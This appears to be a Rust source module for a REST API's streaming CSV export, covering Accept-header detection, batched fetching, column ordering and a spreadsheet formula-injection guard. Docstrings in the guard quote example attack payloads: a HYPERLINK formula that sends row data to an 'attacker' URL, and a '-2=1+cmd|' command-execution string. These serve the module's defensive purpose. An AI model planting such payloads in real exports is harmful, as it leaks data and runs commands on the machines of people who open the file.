//! CSV streaming response handler for the REST transport.
//!
//! When a client sends `Accept: text/csv`, the GET handler delegates to this
//! module. Like NDJSON, CSV is streamed in `O(batch_size)` memory rather than
//! buffering the full result set.
//!
//! Output format:
//! - Optional UTF-8 BOM (`\u{FEFF}`) at the start, controlled by [`ExportConfig::csv_include_bom`]
//!   (default `true` — Excel needs it).
//! - One header row whose columns are the top-level fields of the query result. If `?select=a,b,c`
//!   is provided the column order matches that list (paren-aware: `posts(id,title)` becomes a
//!   single `posts` column); otherwise columns come from `serde_json::Map` iteration, which is
//!   stable (alphabetical) under the default `serde_json` build used in this workspace.
//! - One row per result, RFC 4180 quoting, configurable delimiter via
//!   [`ExportConfig::csv_delimiter`].
//!
//! Scalar values map to their string form; `Null` becomes an empty cell;
//! arrays and objects (embedded relationships) are JSON-serialised into a
//! single cell.
//!
//! Gated behind the `export-csv` Cargo feature.

use std::sync::Arc;

use axum::http::{HeaderMap, HeaderValue};
use bytes::Bytes;
use fraiseql_core::{
    db::traits::DatabaseAdapter,
    runtime::{Executor, QueryMatch},
    security::SecurityContext,
};
use futures::stream;

use super::super::{
    export_config::ExportConfig,
    handler::{PreferHeader, ResolvedGetQuery, RestError, RestHandler, set_request_id},
    params::PaginationParams,
};

/// Content type for CSV responses.
pub const CSV_CONTENT_TYPE: &str = "text/csv";

/// Check whether an `Accept` header value requests CSV.
#[must_use]
pub fn accepts_csv(headers: &HeaderMap) -> bool {
    headers.get("accept").and_then(|v| v.to_str().ok()).is_some_and(|accept| {
        accept.split(',').any(|part| {
            // Strip any parameters (`;q=0.5`, `;charset=utf-8`, etc.).
            let media = part.split(';').next().unwrap_or(part).trim();
            media.eq_ignore_ascii_case(CSV_CONTENT_TYPE)
        })
    })
}

/// Validate that CSV-incompatible preferences are not set.
///
/// Same constraints as NDJSON: count and pagination are unavailable for
/// streaming responses.
///
/// # Errors
///
/// Returns `RestError::BadRequest` when count or pagination is requested
/// alongside CSV streaming.
pub fn validate_csv_request(
    prefer: &PreferHeader,
    pagination: &PaginationParams,
) -> Result<(), RestError> {
    if prefer.count_exact || prefer.count_planned || prefer.count_estimated {
        return Err(RestError::bad_request("count not available for streaming responses"));
    }

    if let PaginationParams::Offset { offset, .. } = pagination {
        if *offset > 0 {
            return Err(RestError::bad_request(
                "pagination not available for streaming; use filters to narrow results",
            ));
        }
    }
    if matches!(pagination, PaginationParams::Cursor { .. }) {
        return Err(RestError::bad_request(
            "pagination not available for streaming; use filters to narrow results",
        ));
    }

    Ok(())
}

/// Execute a query and return results as a streaming CSV response.
///
/// Mirrors [`super::handle_ndjson_get`]: rows are fetched in batches of
/// `rest_config.ndjson_batch_size`, serialised, and streamed to the client.
/// The first batch emits an optional UTF-8 BOM and a header row; subsequent
/// batches emit only data rows.
///
/// # Errors
///
/// Returns `RestError` on route resolution, parameter extraction, or initial
/// query setup failure. Errors that occur mid-stream are emitted as a final
/// CSV record `# error: <message>` (the leading `#` and the absence of the
/// configured delimiter make the line clearly distinguishable from data).
pub async fn handle_csv_get<A: DatabaseAdapter + 'static>(
    handler: &RestHandler<'_, A>,
    export_config: &ExportConfig,
    relative_path: &str,
    query_pairs: &[(&str, &str)],
    headers: &HeaderMap,
    security_context: Option<&SecurityContext>,
) -> Result<CsvResponse, RestError> {
    let resolved = handler.resolve_get_query(relative_path, query_pairs, security_context)?;

    let prefer = PreferHeader::from_headers(headers);
    validate_csv_request(&prefer, &resolved.params.pagination)?;

    let ResolvedGetQuery {
        query_name,
        query_match,
        variables,
        ..
    } = resolved;

    let mut response_headers = HeaderMap::new();
    set_request_id(headers, &mut response_headers);
    response_headers.insert("content-type", HeaderValue::from_static(CSV_CONTENT_TYPE));

    let filename = sanitize_filename(&query_name);
    let disposition = if filename.is_empty() {
        "attachment; filename=\"export.csv\"".to_string()
    } else {
        format!("attachment; filename=\"{filename}.csv\"")
    };
    response_headers.insert(
        "content-disposition",
        HeaderValue::from_str(&disposition)
            .unwrap_or_else(|_| HeaderValue::from_static("attachment; filename=\"export.csv\"")),
    );

    let batch_size = handler.config().ndjson_batch_size.max(1);
    let delimiter = ascii_delimiter(export_config.csv_delimiter);
    let select_columns = extract_select_columns(query_pairs);

    let executor = Arc::clone(handler.executor());
    let security_ctx_owned = security_context.cloned();

    let csv_stream = stream::unfold(
        CsvStreamState {
            executor,
            query_name,
            query_match,
            variables,
            security_ctx: security_ctx_owned,
            batch_size,
            offset: 0,
            done: false,
            delimiter,
            include_bom: export_config.csv_include_bom,
            select_columns,
            columns: None,
            header_emitted: false,
        },
        |mut state| async move {
            if state.done {
                return None;
            }
            match fetch_and_serialize_csv_batch(&mut state).await {
                Ok(Some(bytes)) => Some((Ok(bytes), state)),
                Ok(None) => None,
                Err(err_bytes) => {
                    state.done = true;
                    Some((Ok(err_bytes), state))
                },
            }
        },
    );

    Ok(CsvResponse {
        headers: response_headers,
        body:    CsvBody::Stream(Box::pin(csv_stream)),
    })
}

/// Reduce a query name to characters safe inside an HTTP filename token.
///
/// Keeps ASCII alphanumerics plus `_` and `-`; drops everything else.
fn sanitize_filename(name: &str) -> String {
    name.chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '_' || *c == '-')
        .collect()
}

/// CSV streaming response.
pub struct CsvResponse {
    /// Response headers (content-type, content-disposition, request-id).
    pub headers: HeaderMap,
    /// CSV body — currently always a stream.
    pub body:    CsvBody,
}

/// Body of a CSV response.
#[non_exhaustive]
pub enum CsvBody {
    /// Streaming body (batched execution).
    Stream(
        std::pin::Pin<
            Box<dyn futures::Stream<Item = Result<Bytes, std::convert::Infallible>> + Send>,
        >,
    ),
}

impl CsvBody {
    /// Convert to an axum `Body`.
    pub fn into_body(self) -> axum::body::Body {
        match self {
            Self::Stream(stream) => axum::body::Body::from_stream(stream),
        }
    }
}

// ---------------------------------------------------------------------------
// Streaming internals
// ---------------------------------------------------------------------------

/// Internal state carried through the streaming unfold loop.
struct CsvStreamState<A: DatabaseAdapter> {
    executor:       Arc<Executor<A>>,
    query_name:     String,
    query_match:    QueryMatch,
    variables:      serde_json::Value,
    security_ctx:   Option<SecurityContext>,
    batch_size:     u64,
    offset:         u64,
    done:           bool,
    delimiter:      u8,
    include_bom:    bool,
    /// Column order parsed from `?select=`. `None` means "infer from the
    /// first row's keys (sorted)".
    select_columns: Option<Vec<String>>,
    /// Column list finalised on the first non-empty batch.
    columns:        Option<Vec<String>>,
    /// Tracks whether the header row has been written yet.
    header_emitted: bool,
}

/// Fetch the next batch and serialise it as CSV bytes.
///
/// On the first non-empty batch this writes the optional BOM and the header
/// row. Subsequent batches write only data rows.
async fn fetch_and_serialize_csv_batch<A: DatabaseAdapter>(
    state: &mut CsvStreamState<A>,
) -> Result<Option<Bytes>, Bytes> {
    let mut batch_vars = state.variables.clone();
    if let Some(obj) = batch_vars.as_object_mut() {
        obj.insert("limit".to_string(), serde_json::json!(state.batch_size));
        if state.offset > 0 {
            obj.insert("offset".to_string(), serde_json::json!(state.offset));
        }
    }
    let vars_ref = if batch_vars.as_object().is_none_or(serde_json::Map::is_empty) {
        None
    } else {
        Some(&batch_vars)
    };

    let result_value = match state
        .executor
        .execute_query_direct(&state.query_match, vars_ref, state.security_ctx.as_ref())
        .await
    {
        Ok(r) => r,
        Err(e) => {
            state.done = true;
            return Err(error_csv_line(&e.to_string()));
        },
    };

    let rows = match super::helpers::extract_rows(&result_value, &state.query_name) {
        Ok(r) => r,
        Err(e) => {
            state.done = true;
            return Err(error_csv_line(&e.message));
        },
    };

    if rows.is_empty() {
        // Emit a header-only response if no batch ever produced data and a
        // `?select=` column list is known. Otherwise terminate cleanly.
        if !state.header_emitted && state.offset == 0 {
            if let Some(cols) = state.select_columns.clone() {
                state.columns = Some(cols);
                let bytes = match serialize_batch(state, &[]) {
                    Ok(b) => b,
                    Err(err_bytes) => {
                        state.done = true;
                        return Err(err_bytes);
                    },
                };
                state.done = true;
                return Ok(Some(bytes));
            }
        }
        state.done = true;
        return Ok(None);
    }

    if state.columns.is_none() {
        state.columns = Some(determine_columns(state.select_columns.as_deref(), &rows));
    }

    let bytes = match serialize_batch(state, &rows) {
        Ok(b) => b,
        Err(err_bytes) => {
            state.done = true;
            return Err(err_bytes);
        },
    };

    #[allow(clippy::cast_possible_truncation)]
    // Reason: rows.len() fits in u64 in any realistic batch.
    let row_count = rows.len() as u64;
    if row_count < state.batch_size {
        state.done = true;
    } else {
        state.offset += state.batch_size;
    }

    Ok(Some(bytes))
}

/// Serialise one batch (possibly empty) into bytes, emitting BOM + header on
/// the first call.
fn serialize_batch<A: DatabaseAdapter>(
    state: &mut CsvStreamState<A>,
    rows: &[serde_json::Value],
) -> Result<Bytes, Bytes> {
    let columns = state
        .columns
        .as_ref()
        .ok_or_else(|| error_csv_line("internal error: columns not initialised"))?;

    let payload = write_csv_payload(
        columns,
        rows,
        state.delimiter,
        state.include_bom && !state.header_emitted,
        !state.header_emitted,
    )?;
    state.header_emitted = true;
    Ok(payload)
}

/// Stateless CSV chunk writer. Shared by [`serialize_batch`] and the unit
/// tests.
///
/// - `emit_bom`: prepend the UTF-8 BOM bytes.
/// - `emit_header`: write the column header row before any data rows.
///
/// csv-writer errors are converted into the same `# error:` line format used
/// for mid-stream failures, so the caller can pass them through the stream.
fn write_csv_payload(
    columns: &[String],
    rows: &[serde_json::Value],
    delimiter: u8,
    emit_bom: bool,
    emit_header: bool,
) -> Result<Bytes, Bytes> {
    let mut buf: Vec<u8> = Vec::new();
    if emit_bom {
        buf.extend_from_slice("\u{FEFF}".as_bytes());
    }

    {
        let mut wtr = csv::WriterBuilder::new().delimiter(delimiter).from_writer(&mut buf);

        if emit_header {
            wtr.write_record(columns.iter().map(String::as_str))
                .map_err(|e| error_csv_line(&e.to_string()))?;
        }

        for row in rows {
            let record: Vec<String> = columns
                .iter()
                .map(|c| value_to_csv_field(row.get(c).unwrap_or(&serde_json::Value::Null)))
                .collect();
            wtr.write_record(record.iter().map(String::as_str))
                .map_err(|e| error_csv_line(&e.to_string()))?;
        }

        wtr.flush().map_err(|e| error_csv_line(&e.to_string()))?;
    }

    Ok(Bytes::from(buf))
}

/// Build a clearly-marked error line for mid-stream failures.
///
/// The leading `# error:` keeps the line distinguishable from real CSV data
/// regardless of the configured delimiter — RFC 4180 has no comment syntax,
/// but consumers can grep this prefix to detect a truncated export.
fn error_csv_line(message: &str) -> Bytes {
    // Strip newlines so the marker stays on one line; readers tail-scanning
    // for it shouldn't have to handle multi-line errors.
    let one_line: String = message.chars().map(|c| if c == '\n' { ' ' } else { c }).collect();
    Bytes::from(format!("# error: {one_line}\n"))
}

/// Convert a JSON cell to its CSV string representation.
///
/// Scalar values use their natural string form; `Null` becomes empty; arrays
/// and objects (e.g. embedded relationships) are emitted as their JSON
/// representation inside a single cell. The csv writer handles quoting and
/// escaping based on the delimiter.
///
/// **CSV / formula-injection guard.** Any string-shaped output that starts
/// with one of `=`, `+`, `-`, `@`, `\t`, `\r` is prefixed with a single
/// quote so spreadsheet applications (Excel, `LibreOffice`, Numbers) render
/// it as a literal cell value rather than parsing it as a formula or
/// macro on open.  Without this guard, a cell containing
/// `=HYPERLINK("http://attacker/?leak="&A1,"click")` exfiltrates row data
/// to an attacker-controlled URL when the user opens the export. The
/// prefix character is the standard OWASP mitigation; downstream tooling
/// that wants the raw value sees the leading `'` and must strip it.
fn value_to_csv_field(v: &serde_json::Value) -> String {
    match v {
        serde_json::Value::Null => String::new(),
        serde_json::Value::Bool(b) => b.to_string(),
        // Numbers are emitted in their JSON canonical form. `serde_json::Number`
        // cannot produce a leading dangerous character (only digits, `-`, `.`,
        // and `e/E`); we still guard for `-` because `-2=1+cmd|...` is a
        // documented attack and a negative number leading with `-` lets it
        // sneak through the parser-level filter Excel applies to numeric cells.
        serde_json::Value::Number(n) => guard_formula_injection(&n.to_string()),
        serde_json::Value::String(s) => guard_formula_injection(s),
        other => guard_formula_injection(&serde_json::to_string(other).unwrap_or_default()),
    }
}

/// Single-byte sentinels that trigger formula evaluation in Excel /
/// `LibreOffice` / Numbers when they appear as the first character of a
/// cell.  Tab and CR are included because Excel will treat them as
/// whitespace-prefixed formula starters when followed by `=` etc., and
/// because both are present in OWASP's reference list for this attack.
const FORMULA_INJECTION_SENTINELS: [char; 6] = ['=', '+', '-', '@', '\t', '\r'];

/// Prefixes `value` with a single quote when its first character would
/// otherwise be interpreted by a spreadsheet application as the start of
/// a formula.  See the `value_to_csv_field` docstring for the threat
/// model.  Returns `value` unchanged for non-dangerous prefixes (the
/// common case) so the function is allocation-free on the hot path.
pub(crate) fn guard_formula_injection(value: &str) -> String {
    match value.chars().next() {
        Some(c) if FORMULA_INJECTION_SENTINELS.contains(&c) => {
            let mut out = String::with_capacity(value.len() + 1);
            out.push('\'');
            out.push_str(value);
            out
        },
        _ => value.to_owned(),
    }
}

/// Decide column ordering for the CSV output.
///
/// Preference:
/// 1. `?select=` order, when supplied.
/// 2. First row's `serde_json::Map` iteration order (alphabetical under the workspace's default
///    `serde_json` build).
fn determine_columns(select_columns: Option<&[String]>, rows: &[serde_json::Value]) -> Vec<String> {
    if let Some(cols) = select_columns {
        return cols.to_vec();
    }
    rows.first()
        .and_then(|v| v.as_object())
        .map(|m| m.keys().cloned().collect())
        .unwrap_or_default()
}

/// Extract `?select=` top-level columns from the request's query pairs.
///
/// Returns `None` if the parameter is absent, empty, or contains no usable
/// top-level field names.
fn extract_select_columns(query_pairs: &[(&str, &str)]) -> Option<Vec<String>> {
    let raw = query_pairs.iter().find(|(k, _)| *k == "select").map(|(_, v)| *v)?;
    let cols = parse_select_top_level(raw);
    if cols.is_empty() { None } else { Some(cols) }
}

/// Paren-aware split of `?select=` into top-level column names.
///
/// `id,name,posts(id,title)` → `["id", "name", "posts"]`.
fn parse_select_top_level(select_raw: &str) -> Vec<String> {
    let mut cols = Vec::new();
    let mut depth = 0_usize;
    let mut current = String::new();
    for c in select_raw.chars() {
        match c {
            '(' => {
                depth += 1;
                current.push(c);
            },
            ')' => {
                depth = depth.saturating_sub(1);
                current.push(c);
            },
            ',' if depth == 0 => {
                push_top_level(&mut cols, &current);
                current.clear();
            },
            _ => current.push(c),
        }
    }
    push_top_level(&mut cols, &current);
    cols
}

fn push_top_level(cols: &mut Vec<String>, current: &str) {
    let trimmed = current.trim();
    if trimmed.is_empty() {
        return;
    }
    // For `posts(id,title)` we only want the bare `posts` part.
    let head = trimmed.split('(').next().unwrap_or("").trim();
    if !head.is_empty() {
        cols.push(head.to_string());
    }
}

/// Coerce a `char` delimiter into the single byte the csv writer expects.
///
/// Falls back to comma when the configured delimiter is not a single ASCII
/// byte — `csv::WriterBuilder::delimiter` rejects multi-byte delimiters at
/// runtime, so this guard keeps the writer constructible.
const fn ascii_delimiter(c: char) -> u8 {
    if c.is_ascii() && c.len_utf8() == 1 {
        c as u8
    } else {
        b','
    }
}

#[cfg(test)]
mod tests;
